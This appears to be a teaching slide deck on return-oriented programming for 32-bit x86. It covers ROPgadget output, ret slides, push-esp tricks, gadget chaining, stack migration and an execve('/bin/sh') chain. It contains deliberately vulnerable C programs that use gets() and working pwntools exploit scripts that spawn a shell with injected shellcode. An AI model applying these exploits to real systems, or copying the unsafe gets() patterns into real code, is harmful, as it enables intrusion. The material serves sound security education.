# ROP

DuckLL  
2017/3/21 <!-- .element: align="right" -->

---

# Review

--

## Caller

|          |
| -------- |
| ...      |
| call foo |
|          |

## Callee

|                 |
| --------------- |
| ~~push ebp~~    |
| ~~mov ebp esp~~ |
| ...             |
| ~~leave~~       |
| ret             |
|                 |

--

# After Callee

## state: ret

| Address | Content                         |
| ------- | ------------------------------- |
| ESP     | Entrypoint                      |
| ESP+4   | Return Address(Next Entrypoint) |
| ESP+8   | Arguments                       |

- See as a shift window
- Enter a function will pop a word

--

# If A,B,C have no arguments

| Address | Content |
| ------- | ------- |
| ESP     | A       |
| ESP+4   | B       |
| ESP+8   | C       |

Flow: A->B->C

---

# ROPgadget

--

# x86 ASM Feature

- Variable Code length

```python
In [13]: print disasm("3a4d")
   0:   33 61 34                xor    esp,DWORD PTR [ecx+0x34]
   3:   64                      fs

In [14]: print disasm("a4d")
   0:   61                      popa
   1:   34 64                   xor    al,0x64
```

### 斷章取義!

--

## Key point

# ret

有 ret 才像是 function 結尾  
可以滑到到下一個 entry

--

# ROPgadget

```shell
ROPgadget --binary ./bin > gadget
```

```asm
Gadgets information
============================================================
0x08048609 : adc al, 0x41 ; ret
0x0804842e : adc al, 0x50 ; call edx
0x08048473 : adc al, ch ; ret 0xffff
0x080483a7 : adc cl, cl ; ret
0x08048408 : add al, 8 ; add ecx, ecx ; ret
0x080483a1 : add al, 8 ; call eax
0x080483db : add al, 8 ; call edx
0x080484ef : add bl, dh ; ret
0x080482e8 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x0804847c : add byte ptr [eax], al ; mov ecx, dword ptr [ebp - 4] ; leave ; lea esp, dword ptr [ecx - 4] ; ret
0x0804847d : add byte ptr [ebx - 0x723603b3], cl ; popal ; cld ; ret
0x08048405 : add eax, 0x804a020 ; add ecx, ecx ; ret
0x080484ff : add ebx, dword ptr [ebx] ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x0804840a : add ecx, ecx ; ret
0x080483a5 : add esp, 0x10 ; leave ; ret
0x0804844d : add esp, 0x10 ; nop ; leave ; ret
0x080484e5 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080482ea : add esp, 8 ; pop ebx ; ret
0x08048406 : and byte ptr [eax - 0x36fef7fc], ah ; ret
0x08048606 : and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x080482d0 : call 0x8048376
0x080483a3 : call eax
0x080483dd : call edx
0x08048480 : cld ; leave ; lea esp, dword ptr [ecx - 4] ; ret
0x08048484 : cld ; ret
0x0804847f : dec ebp ; cld ; leave ; lea esp, dword ptr [ecx - 4] ; ret
0x08048604 : dec ebp ; push cs ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x0804842d : in al, dx ; adc al, 0x50 ; call edx
0x0804842b : in eax, -0x7d ; in al, dx ; adc al, 0x50 ; call edx
0x0804844c : inc dword ptr [ebx - 0x366fef3c] ; ret
0x0804860a : inc ecx ; ret
0x08048607 : inc edi ; push cs ; adc al, 0x41 ; ret
0x080484ee : jbe 0x80484f3 ; ret
0x08048427 : je 0x8048424 ; push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx
0x080484e4 : jecxz 0x8048471 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x080484e3 : jne 0x80484d1 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080484ed : lea esi, dword ptr [esi] ; ret
0x08048482 : lea esp, dword ptr [ecx - 4] ; ret
0x08048481 : leave ; lea esp, dword ptr [ecx - 4] ; ret
0x080483a8 : leave ; ret
0x080482eb : les ecx, ptr [eax] ; pop ebx ; ret
0x080484e6 : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x080483a6 : les edx, ptr [eax] ; leave ; ret
0x0804844e : les edx, ptr [eax] ; nop ; leave ; ret
0x08048407 : mov al, byte ptr [0xc9010804] ; ret
0x08048404 : mov byte ptr [0x804a020], 1 ; leave ; ret
0x0804842a : mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx
0x08048370 : mov ebx, dword ptr [esp] ; ret
0x0804847e : mov ecx, dword ptr [ebp - 4] ; leave ; lea esp, dword ptr [ecx - 4] ; ret
0x08048450 : nop ; leave ; ret
0x0804836f : nop ; mov ebx, dword ptr [esp] ; ret
0x0804836d : nop ; nop ; mov ebx, dword ptr [esp] ; ret
0x0804836b : nop ; nop ; nop ; mov ebx, dword ptr [esp] ; ret
0x0804819e : nop ; ret 0x3b7e
0x080484e7 : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x080483a2 : or bh, bh ; rol byte ptr [ebx - 0xc36ef3c], 1 ; ret
0x080483dc : or bh, bh ; rol byte ptr [ebx - 0xc36ef3c], cl ; ret
0x08048409 : or byte ptr [ecx], al ; leave ; ret
0x080484eb : pop ebp ; ret
0x080484e8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080482ed : pop ebx ; ret
0x080484ea : pop edi ; pop ebp ; ret
0x080484e9 : pop esi ; pop edi ; pop ebp ; ret
0x08048483 : popal ; cld ; ret
0x0804839e : push 0x804a020 ; call eax
0x080483d8 : push 0x804a020 ; call edx
0x08048608 : push cs ; adc al, 0x41 ; ret
0x08048605 : push cs ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x08048602 : push cs ; xor byte ptr [ebp + 0xe], cl ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x0804842f : push eax ; call edx
0x080483d7 : push eax ; push 0x804a020 ; call edx
0x08048429 : push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx
0x08048493 : push ebx ; call 0x8048377
0x08048491 : push edi ; push esi ; push ebx ; call 0x8048379
0x08048492 : push esi ; push ebx ; call 0x8048378
0x08048198 : ret
0x0804819f : ret 0x3b7e
0x080483be : ret 0xeac1
0x08048475 : ret 0xffff
0x080483a4 : rol byte ptr [ebx - 0xc36ef3c], 1 ; ret
0x080483de : rol byte ptr [ebx - 0xc36ef3c], cl ; ret
0x08048371 : sbb al, 0x24 ; ret
0x0804819a : sub eax, 0x90229379 ; ret 0x3b7e
0x080483d4 : sub esp, 0x10 ; push eax ; push 0x804a020 ; call edx
0x0804839b : sub esp, 0x14 ; push 0x804a020 ; call eax
0x0804842c : sub esp, 0x14 ; push eax ; call edx
0x080482cd : sub esp, 8 ; call 0x8048379
0x08048603 : xor byte ptr [ebp + 0xe], cl ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret

Unique gadgets found: 88
```

---

# Tip 1: ret slide

## ret;

padding 不確定

--

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char global[100];
void vul(){
    char buf[4];
    gets(buf);
    strcpy(global,buf);
    return;
}
int main(int argc, char *argv[])
{
    vul();
    return 0;
}
```

```shell
gcc -m32 -fno-stack-protector -z execstack -o demo ./demo.c
```

[demo](https://drive.google.com/open?id=0B5w3KuqR3zoBR0MzYllkRlM2X2c)

```python
from pwn import *
context.arch="i386"

elf=ELF('./demo')
ret=0x080482d6

io=process("./demo")
payload=p32(ret)*5
payload+=p32(elf.symbols['global']+len(payload)+4)
payload+=asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
```

--

# Payload

| stack   |
| ------- |
| ret     |
| ret     |
| ret     |
| ret     |
| ret     |
| payload |
|         |

--

# Flow

1. eip->ret
1. eip->ret
1. eip->ret
1. payload

---

# Tip 2: push esp ret

## \_start+32

jmp shellcode

--

```c
#include <stdio.h>
void vul(){
    char buf[100];
    gets(buf);
    return;
}
int main(int argc, char *argv[])
{
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    vul();
    return 0;
}
```

```shell
gcc -m32 -fno-stack-protector -z execstack -o b ./b.c
```

```python
from pwn import *
elf=ELF('./b')

io=process("./b")
gdb.attach(io)
padding=112
push_esp=elf.symbols['_start']+32

payload="A"*padding
payload+=p32(push_esp)
payload+=asm(shellcraft.sh())

io.sendline(payload)
io.interactive()
```

--

## befor push esp

| stack        |
| ------------ |
| padding      |
| push esp ret |
| shellcode    |
|              |

## after push esp

| stack            |
| ---------------- |
| padding          |
| adr of shellcode |
| shellcode        |
|                  |

--

# Flow

1. push adr of shellcode
1. shellcode

---

# Tip 3: pop x ret

## pop ebx; pop edx; pop ecx; ret;

chain 有 argument 的 function

--

## Payload

| stack     |
| --------- |
| read      |
| pop 3 ret |
| 0         |
| buf       |
| 100       |
| system    |
| pop 1 ret |
| buf       |
| exit      |
| 0         |
| 0         |

--

# Flow

1. read(0,buf,100)
1. pop 3 ret(esp+12)
1. system(buf)
1. pop 1 ret(esp+4)
1. exit(0)

---

## Tip 4: Stack Migration

### leave; ret;

做多次的 ROP  
有些狀況必須利用前一次的結果來形成下一次的 payload  
ex: leak libc base -> call system(libc)

--

# Payload

| stack     | buf1      | buf2      |
| --------- | --------- | --------- |
| buf1      | buf2      | buf1      |
| gets      | puts      | system    |
| leave ret | pop1 ret  | pop1 ret  |
| buf1      | got       | "/bin/sh" |
|           | gets      | gets      |
|           | leave ret | leave ret |
|           | buf2      | buf1      |

--

# Flow

1. ebp->buf1
1. gets(buf1)
1. ebp->buf2 esp->buf1+4
1. puts(got)
1. gets(buf2)
1. ebp->buf1 esp->buf2+4
1. system("/bin/sh")

---

# Tip 5: execve("/bin/sh")

## Static link

## pop e?x; ret;

## int 0x80;

set regs and syscall

--

# Payload

| stack               |
| ------------------- |
| pop eax ret         |
| 0xB                 |
| pop edx ecx ebx ret |
| 0                   |
| 0                   |
| "/bin/sh"           |
| int 0x80            |

--

# Flow

1. eax->11
1. edx->0 ecx->0 ebx->adr of shell
1. system call
1. execve("/bin/sh",0,0)

---

#Q & A

--

#END
